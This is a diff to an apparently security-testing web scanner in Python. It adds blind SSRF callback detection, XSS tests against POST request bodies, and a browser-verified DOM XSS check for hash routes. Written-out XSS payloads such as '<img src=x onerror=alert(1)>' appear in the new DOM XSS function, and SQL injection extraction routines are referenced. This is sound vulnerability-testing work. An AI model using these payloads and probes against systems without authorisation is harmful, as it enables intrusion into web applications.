+        headers = []
+        if api_key:
+            headers = ["-H", f"Authorization: Bearer {api_key}"]
+
+        out, _, rc = await run([
+            "curl", "-sS", "-k", "--max-time", str(timeout),
+            callback_server_api,
+        ] + headers, timeout=timeout + 5)
+
+        if rc == 0 and out:
+            try:
+                data = json.loads(out)
+                # Look for matching callbacks in the response
+                # (Format depends on callback server implementation)
+                received = data.get("interactions", []) or data.get("callbacks", []) or []
+
+                for callback in expected_callbacks:
+                    callback_id = callback.split(".")[0] if "." in callback else callback
+                    for interaction in received:
+                        interaction_host = (
+                            interaction.get("hostname", "") or
+                            interaction.get("subdomain", "") or
+                            str(interaction)
+                        )
+                        if callback_id in interaction_host:
+                            results["callbacks_received"].append({
+                                "callback": callback,
+                                "interaction": interaction,
+                                "timestamp": interaction.get("timestamp"),
+                            })
+                            results["vulnerable"] = True
+                            results["findings"].append({
+                                "type": "blind_ssrf",
+                                "severity": "high",
+                                "title": "Blind SSRF via OOB callback",
+                                "callback": callback,
+                                "evidence": interaction,
+                                "cwe": "CWE-918",
+                            })
+            except json.JSONDecodeError:
+                results["error"] = "Failed to parse callback server response"
+    except Exception as e:
+        results["error"] = str(e)
+
     return results
 
 
@@ -2523,7 +4876,7 @@ async def detect_dbms(url: str, param: str | None = None) -> dict:
         if param:
             # Inject into specific parameter
             parsed = urllib.parse.urlparse(url)
-            query_params = urllib.parse.parse_qs(parsed.query)
+            query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
             query_params[param] = [payload]
             new_query = urllib.parse.urlencode(query_params, doseq=True)
             test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
@@ -2860,6 +5213,44 @@ def _build_body_template(endpoint: dict[str, Any], param: str | None = None) -> 
     return body
 
 
+def _apply_body_param(base_body: Any, param: str, value: Any) -> Any:
+    """Apply a parameter value to a body template, handling nested keys.
+
+    Args:
+        base_body: The body template (dict, list, or None)
+        param: Parameter name (supports nested keys like "user.name" or "data[0].id")
+        value: Value to set for the parameter
+
+    Returns:
+        A copy of the body with the parameter set to the value
+    """
+    if base_body is None:
+        return {param: value}
+    if isinstance(base_body, list):
+        new_body = copy.deepcopy(base_body)
+        if not new_body:
+            new_body = [{}] if param != "__item__" else [value]
+        if param == "__item__":
+            new_body[0] = value
+        elif isinstance(new_body[0], dict):
+            if "." in param or "[" in param:
+                _set_nested_value(new_body[0], param, value, overwrite=True)
+            else:
+                new_body[0][param] = value
+        else:
+            # For array-of-primitives (e.g., ["string"]), inject value directly
+            new_body[0] = value
+        return new_body
+    if not isinstance(base_body, dict):
+        base_body = {}
+    new_body = copy.deepcopy(base_body)
+    if "." in param or "[" in param:
+        _set_nested_value(new_body, param, value, overwrite=True)
+    else:
+        new_body[param] = value
+    return new_body
+
+
 _CURL_STATUS_MARKER = "__CURL_STATUS__:"
 
 
@@ -2965,21 +5356,6 @@ async def smart_sqli_test(
 
     auth_args = get_auth_curl_args(auth_session)
 
-    def _apply_body_param(body: Any, param: str, value: Any) -> Any:
-        """Return a copy of body with param injected (supports dict or list bodies)."""
-        if isinstance(body, list):
-            new_body = copy.deepcopy(body)
-            if not new_body:
-                new_body = [{}] if param != "__item__" else [value]
-            if isinstance(new_body[0], dict):
-                new_body[0][param] = value
-            else:
-                new_body[0] = value
-            return new_body
-        new_body = dict(body) if body else {}
-        new_body[param] = value
-        return new_body
-
     # Separate GET and POST endpoints to ensure both get tested
     def _method_allowed(endpoint: dict[str, Any], method: str) -> bool:
         allowed = endpoint.get("allowed_methods")
@@ -3027,7 +5403,7 @@ async def smart_sqli_test(
             results["params_tested"] += 1
             # Get baseline
             parsed = urllib.parse.urlparse(endpoint_url)
-            baseline_params = dict(urllib.parse.parse_qsl(parsed.query))
+            baseline_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
             for name, value in param_defaults.items():
                 if name not in baseline_params:
                     baseline_params[name] = _stringify_body_value(value)
@@ -3337,7 +5713,7 @@ async def sqli_data_extraction(
         parsed = urllib.parse.urlparse(url)
 
         if method == "GET":
-            query_params = dict(urllib.parse.parse_qsl(parsed.query))
+            query_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
             query_params[param] = payload
             test_query = urllib.parse.urlencode(query_params)
             test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
@@ -3520,7 +5896,7 @@ async def oob_sqli_test(
     parsed = urllib.parse.urlparse(url)
 
     for payload in payloads:
-        query_params = dict(urllib.parse.parse_qsl(parsed.query))
+        query_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
         query_params[param] = payload
         test_query = urllib.parse.urlencode(query_params)
         test_url = urllib.parse.urlunparse(parsed._replace(query=test_query))
@@ -3733,6 +6109,7 @@ async def smart_xss_test(
         Dict with XSS findings
     """
     import random
+    import copy
 
     results = {
         "findings": [],
@@ -3740,22 +6117,59 @@ async def smart_xss_test(
         "params_tested": 0,
         "reflections_found": 0,
         "vulnerabilities_found": 0,
+        "get_endpoints_tested": 0,
+        "post_endpoints_tested": 0,
     }
 
     auth_args = get_auth_curl_args(auth_session)
 
-    for endpoint in endpoints[:max_endpoints]:
-        endpoint_url = endpoint.get("url", "")
-        params = endpoint.get("params", [])
+    def _coerce_param_list(raw: Any) -> list[str]:
+        if isinstance(raw, dict):
+            return [str(k) for k in raw.keys() if k]
+        if isinstance(raw, (list, tuple, set)):
+            return [str(v) for v in raw if v]
+        if isinstance(raw, str):
+            return [raw] if raw else []
+        return []
+
+    def _method_allowed(endpoint: dict[str, Any], method: str) -> bool:
         allowed = endpoint.get("allowed_methods")
-        if allowed and "GET" not in [m.upper() for m in allowed]:
-            continue
+        if allowed:
+            return method in [m.upper() for m in allowed]
+        return True
+
+    def _is_file_param(name: str) -> bool:
+        name_l = name.lower()
+        return any(tok in name_l for tok in ("file", "upload", "attachment", "image", "avatar", "photo"))
+
+    # Separate GET and POST endpoints to ensure both get tested
+    get_endpoints = [
+        e for e in endpoints
+        if e.get("method", "GET").upper() == "GET"
+        and _method_allowed(e, "GET")
+    ]
+    post_endpoints = [
+        e for e in endpoints
+        if e.get("method", "GET").upper() in ("POST", "PUT", "PATCH")
+        and _method_allowed(e, e.get("method", "GET").upper())
+    ]
+
+    # Test GET endpoints
+    for endpoint in get_endpoints[:max_endpoints]:
+        endpoint_url = endpoint.get("url", "")
+        # Resolve path parameters like {id} or :id
+        if "{" in endpoint_url or re.search(r"/:[^/?#]+", endpoint_url):
+            endpoint_url = _resolve_path_params(endpoint_url)
+            if "{" in endpoint_url:
+                continue
+        params = _coerce_param_list(endpoint.get("params") or endpoint.get("query_params"))
         param_defaults = endpoint.get("param_defaults") or endpoint.get("query_param_defaults") or {}
 
         if not params:
             continue
 
         results["endpoints_tested"] += 1
+        results["get_endpoints_tested"] += 1
 
         for param in params[:max_params_per_endpoint]:
             results["params_tested"] += 1
@@ -3763,7 +6177,7 @@ async def smart_xss_test(
             canary = f"xss{random.randint(10000, 99999)}test"
 
             parsed = urllib.parse.urlparse(endpoint_url)
-            test_params = dict(urllib.parse.parse_qsl(parsed.query))
+            test_params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
             for name, value in param_defaults.items():
                 if name not in test_params:
                     test_params[name] = _stringify_body_value(value)
@@ -3866,6 +6280,7 @@ async def smart_xss_test(
                         "type": "XSS",
                         "subtype": context,
                         "url": endpoint_url,
+                        "method": "GET",
                         "param": param,
                         "payload": payload,
                         "technique": technique,
@@ -3884,6 +6299,251 @@ async def smart_xss_test(
                     results["findings"].append(finding)
                     results["vulnerabilities_found"] += 1
                     break  # One confirmed XSS per param is enough
+
+    # Test POST/PUT/PATCH endpoints with body params
+    for endpoint in post_endpoints[:max_endpoints]:
+        endpoint_url = endpoint.get("url", "")
+        # Resolve path parameters like {id} or :id
+        if "{" in endpoint_url or re.search(r"/:[^/?#]+", endpoint_url):
+            endpoint_url = _resolve_path_params(endpoint_url)
+            if "{" in endpoint_url:
+                continue
+
+        method = endpoint.get("method", "POST").upper()
+        body_params = _coerce_param_list(endpoint.get("body_params") or endpoint.get("params"))
+        content_type = endpoint.get("content_type") or "application/json"
+
+        if not body_params:
+            continue
+
+        results["endpoints_tested"] += 1
+        results["post_endpoints_tested"] += 1
+
+        base_body = _build_body_template(endpoint)
+        is_array_body = isinstance(base_body, list)
+        if is_array_body and "json" not in content_type.lower():
+            continue
+
+        auth_post_args = _filter_curl_headers(auth_args, {"content-type"})
+
+        for param in body_params[:max_params_per_endpoint]:
+            if "multipart/form-data" in content_type.lower() and _is_file_param(param):
+                continue
+            results["params_tested"] += 1
+
+            canary = f"xss{random.randint(10000, 99999)}test"
+            test_body = _apply_body_param(base_body, param, canary)
+            body_args, header_args = _build_curl_body_args(test_body, content_type)
+
+            out, err, rc = await run([
+                "curl", "-sS", "-L", "-k", "--max-time", "10",
+                "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+                "-X", method,
+            ] + auth_post_args + header_args + body_args + [endpoint_url], timeout=12)
+
+            if rc != 0 or not out:
+                continue
+
+            if canary not in out:
+                continue
+
+            results["reflections_found"] += 1
+
+            context = detect_reflection_context(out, canary)
+            if context == "not_reflected":
+                continue
+
+            payloads = CONTEXT_XSS_PAYLOADS.get(context, CONTEXT_XSS_PAYLOADS["in_html"])
+
+            for payload, technique, description in payloads:
+                payload_body = _apply_body_param(base_body, param, payload)
+                payload_args, payload_headers = _build_curl_body_args(payload_body, content_type)
+
+                payload_out, _, payload_rc = await run([
+                    "curl", "-sS", "-L", "-k", "--max-time", "10",
+                    "-H", "User-Agent: Mozilla/5.0 (compatible; SecurityScanner/1.0)",
+                    "-X", method,
+                ] + auth_post_args + payload_headers + payload_args + [endpoint_url], timeout=12)
+
+                if payload_rc != 0 or not payload_out:
+                    continue
+
+                is_vulnerable = False
+                evidence = []
+
+                if payload in payload_out:
+                    escaped_variants = [
+                        payload.replace("<", "&lt;"),
+                        payload.replace(">", "&gt;"),
+                        payload.replace("'", "&#39;"),
+                        payload.replace('"', "&quot;"),
+                        urllib.parse.quote(payload),
+                    ]
+                    if not any(ev in payload_out for ev in escaped_variants):
+                        is_vulnerable = True
+                        evidence.append(f"Payload reflected unescaped in {context}")
+
+                if context == "in_angular" and "{{7*7}}" in payload:
+                    if "49" in payload_out:
+                        is_vulnerable = True
+                        evidence.append("Angular expression evaluated: {{7*7}} = 49")
+
+                if is_vulnerable:
+                    severity = "high" if context in ["in_script", "in_angular"] else "medium"
+                    confidence = 0.85
+                    verified = False
+
+                    finding = {
+                        "type": "XSS",
+                        "subtype": context,
+                        "url": endpoint_url,
+                        "method": method,
+                        "param": param,
+                        "payload": payload,
+                        "technique": technique,
+                        "description": description,
+                        "evidence": evidence,
+                        "confidence": confidence,
+                        "severity": severity,
+                        "verified": verified,
+                        "content_type": content_type,
+                        "body": payload_body,
+                    }
+                    request_headers = _headers_from_curl_args(auth_post_args + payload_headers)
+                    if request_headers:
+                        finding["request_headers"] = request_headers
+
+                    results["findings"].append(finding)
+                    results["vulnerabilities_found"] += 1
+                    break  # One confirmed XSS per param is enough
+
+    # Note: Hash route DOM XSS is tested separately via hash_route_dom_xss_test()
+    # which is called unconditionally in smart scans (not gated by run_xss flag)
+
+    return results
+
+
+async def hash_route_dom_xss_test(
+    endpoints: list[dict],
+    max_endpoints: int = 50,
+    max_params_per_endpoint: int = 5,
+) -> dict:
+    """
+    Test hash route endpoints for DOM XSS vulnerabilities.
+
+    This test always runs in smart scans regardless of --xss flag because:
+    1. DOM XSS in hash routes is a distinct vulnerability class
+    2. Static DOM XSS analysis may miss dynamic exploitation
+    3. SPAs commonly use hash routes for navigation
+
+    Requires Playwright for browser-based verification.
+
+    Args:
+        endpoints: List of endpoints with params to test
+        max_endpoints: Max hash route endpoints to test
+        max_params_per_endpoint: Max params to test per endpoint
+
+    Returns:
+        Dict with DOM XSS findings for hash routes
+    """
+    results = {
+        "findings": [],
+        "endpoints_tested": 0,
+        "params_tested": 0,
+        "vulnerabilities_found": 0,
+    }
+
+    # Filter to hash route endpoints only
+    hash_route_endpoints = [
+        e for e in endpoints
+        if _is_hash_route(e.get("url", ""))
+    ]
+
+    if not hash_route_endpoints:
+        return results
+
+    if not HAS_XSS_PROOF:
+        print(f"[dom-xss] Skipping {len(hash_route_endpoints)} hash route endpoints: Playwright not available", file=sys.stderr)
+        results["skipped"] = True
+        results["reason"] = "playwright_not_available"
+        return results
+
+    print(f"[dom-xss] Testing {min(len(hash_route_endpoints), max_endpoints)} hash route endpoints for DOM XSS", file=sys.stderr)
+
+    # DOM XSS payloads for fragment injection
+    DOM_XSS_PAYLOADS = [
+        ("<img src=x onerror=alert(1)>", "img_onerror", "Image onerror event"),
+        ("<svg onload=alert(1)>", "svg_onload", "SVG onload event"),
+        ("'-alert(1)-'", "js_expression", "JavaScript expression injection"),
+        ("\"><img src=x onerror=alert(1)>", "attr_break_img", "Attribute breakout to image"),
+    ]
+
+    def _coerce_param_list(raw: Any) -> list[str]:
+        if isinstance(raw, dict):
+            return [str(k) for k in raw.keys() if k]
+        if isinstance(raw, (list, tuple, set)):
+            return [str(v) for v in raw if v]
+        if isinstance(raw, str):
+            return [raw] if raw else []
+        return []
+
+    for endpoint in hash_route_endpoints[:max_endpoints]:
+        endpoint_url = endpoint.get("url", "")
+        base_url, frag_path, frag_params = _parse_fragment_params(endpoint_url)
+
+        # Get params from endpoint definition or fragment
+        params = _coerce_param_list(endpoint.get("params") or endpoint.get("query_params"))
+        if not params and frag_params:
+            params = list(frag_params.keys())
+
+        if not params:
+            continue
+
+        results["endpoints_tested"] += 1
+
+        for param in params[:max_params_per_endpoint]:
+            results["params_tested"] += 1
+
+            for payload, technique, description in DOM_XSS_PAYLOADS:
+                # Build test URL with payload in fragment parameter
+                test_frag_params = dict(frag_params) if frag_params else {}
+                test_frag_params[param] = [payload]
+                test_url = _build_fragment_url(base_url, frag_path, test_frag_params)
+
+                # Must use browser-based verification for DOM XSS
+                try:
+                    proof = await prove_xss_headless(
+                        url=base_url,
+                        param=param,
+                        payload=payload,
+                        screenshot_dir=None,
+                        fragment_path=frag_path,
+                        fragment_params=test_frag_params,
+                    )
+                    if proof and proof.proven:
+                        severity = "high" if proof.confidence >= 0.9 else "medium"
+                        finding = {
+                            "type": "XSS",
+                            "subtype": "dom_xss_hash_route",
+                            "url": test_url,
+                            "method": "GET",
+                            "param": param,
+                            "payload": payload,
+                            "technique": technique,
+                            "description": description,
+                            "evidence": [f"Browser proof: {proof.technique}", f"Confidence: {proof.confidence}"],
+                            "confidence": proof.confidence,
+                            "severity": severity,
+                            "verified": True,
+                        }
+                        if hasattr(proof, "to_dict"):
+                            finding["browser_proof"] = proof.to_dict()
+                        results["findings"].append(finding)
+                        results["vulnerabilities_found"] += 1
+                        break  # Found vulnerability for this param
+                except Exception:
+                    # Browser proof failed, continue with other payloads
+                    pass
 
     return results
 
@@ -4079,6 +6739,23 @@ def _analyze_js_content(js_content: str, source_url: str) -> list[dict]:
 
     Returns list of potential vulnerability findings.
     """
+    # Skip known library/framework files to reduce false positives
+    library_patterns = [
+        "vendor.", "vendor-", "vendors.",
+        "angular.", "angular-", "angular/",
+        "react.", "react-", "react/",
+        "vue.", "vue-", "vue/",
+        "jquery.", "jquery-",
+        "lodash.", "moment.", "rxjs.",
+        "zone.", "polyfill",
+        "runtime.", "webpack",
+        "node_modules/", ".min.js",
+        "chunk.", "chunks/",
+    ]
+    url_lower = source_url.lower()
+    if any(pattern in url_lower for pattern in library_patterns):
+        return []  # Skip library files
+
     findings = []
 
     # Split into lines for line number tracking
@@ -4228,10 +6905,19 @@ async def run_smart_active_tests(
             "reason": "xss_tests_disabled",
         }
 
+    # Hash route DOM XSS always runs in smart scans (not gated by run_xss)
+    # because it's a distinct vulnerability class requiring browser verification
+    hash_route_results = await hash_route_dom_xss_test(
+        endpoints,
+        max_endpoints=xss_max_endpoints,
+        max_params_per_endpoint=xss_max_params
+    )
+
     # Combine findings
     sqli_findings = sqli_results.get("findings", [])
     xss_findings = xss_results.get("findings", [])
-    all_findings = sqli_findings + xss_findings
+    hash_route_findings = hash_route_results.get("findings", [])
+    all_findings = sqli_findings + xss_findings + hash_route_findings
 
     return {
         "findings": all_findings,
@@ -4245,13 +6931,16 @@ async def run_smart_active_tests(
             "params_tested": sqli_results.get("params_tested", 0),
         },
         "xss": {
-            "findings": xss_findings,
+            "findings": xss_findings + hash_route_findings,  # Include hash route DOM XSS in XSS results
             "reflections_found": xss_results.get("reflections_found", 0),
-            "vulnerabilities_found": xss_results.get("vulnerabilities_found", 0),
-            "endpoints_tested": xss_results.get("endpoints_tested", 0),
-            "params_tested": xss_results.get("params_tested", 0),
+            "vulnerabilities_found": xss_results.get("vulnerabilities_found", 0) + hash_route_results.get("vulnerabilities_found", 0),
+            "endpoints_tested": xss_results.get("endpoints_tested", 0) + hash_route_results.get("endpoints_tested", 0),
+            "params_tested": xss_results.get("params_tested", 0) + hash_route_results.get("params_tested", 0),
+            "get_endpoints_tested": xss_results.get("get_endpoints_tested", 0) + hash_route_results.get("endpoints_tested", 0),
+            "post_endpoints_tested": xss_results.get("post_endpoints_tested", 0),
         },
+        "hash_route_dom_xss": hash_route_results,  # Separate tracking for hash route DOM XSS
         "dbms_detected": sqli_results.get("dbms_detected"),
-        "total_endpoints_tested": sqli_results.get("endpoints_tested", 0) + xss_results.get("endpoints_tested", 0),
-        "total_params_tested": sqli_results.get("params_tested", 0) + xss_results.get("params_tested", 0),
+        "total_endpoints_tested": sqli_results.get("endpoints_tested", 0) + xss_results.get("endpoints_tested", 0) + hash_route_results.get("endpoints_tested", 0),
+        "total_params_tested": sqli_results.get("params_tested", 0) + xss_results.get("params_tested", 0) + hash_route_results.get("params_tested", 0),
     }
